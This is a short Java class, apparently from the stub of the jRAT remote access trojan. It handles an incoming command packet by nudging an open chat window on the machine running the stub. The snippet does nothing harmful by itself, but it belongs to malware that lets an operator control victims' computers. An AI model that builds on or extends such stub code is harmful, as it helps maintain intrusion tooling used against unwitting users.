package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;

public class Packet58NudgeChat extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (Connection.frameChat != null) {
			Connection.frameChat.nudge();
		}
	}

}
